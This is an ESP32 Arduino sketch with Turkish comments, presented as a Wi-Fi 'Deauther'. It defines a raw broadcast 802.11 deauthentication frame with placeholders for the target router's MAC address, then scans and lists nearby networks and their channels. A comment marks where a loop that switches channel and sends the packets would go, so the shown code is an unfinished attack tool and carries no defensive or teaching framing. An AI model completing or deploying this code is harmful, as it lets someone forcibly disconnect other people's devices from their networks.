#include "WiFi.h"

// Deauth paketi yapısı (802.11 Management Frame - Deauthentication)
uint8_t packet[128] = {
  0xC0, 0x00, 0x3A, 0x01, // Frame Control, Duration
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Receiver MAC (Broadcast)
  0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // Source MAC (Modem MAC adresi buraya gelecek)
  0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // BSSID (Modem MAC adresi)
  0x00, 0x00, // Sequence number
  0x07, 0x00  // Reason code (Class 3 frame received from nonassociated station)
};

void setup() {
  Serial.begin(115200);
  WiFi.mode(WIFI_MODE_STA);
  WiFi.disconnect();
  
  Serial.println("ESP32 Deauther Başlatıldı...");
}

void loop() {
  // Çevredeki ağları tara
  int n = WiFi.scanNetworks();
  Serial.println("Ağlar taranıyor...");
  
  for (int i = 0; i < n; ++i) {
    Serial.print(i + 1);
    Serial.print(": ");
    Serial.print(WiFi.SSID(i));
    Serial.print(" (Kanal: ");
    Serial.print(WiFi.channel(i));
    Serial.println(")");
    
    // İstediğin ağın kanalına geçip paket basma döngüsü buraya eklenebilir
    delay(10);
  }
  
  WiFi.scanDelete();
  delay(5000);
}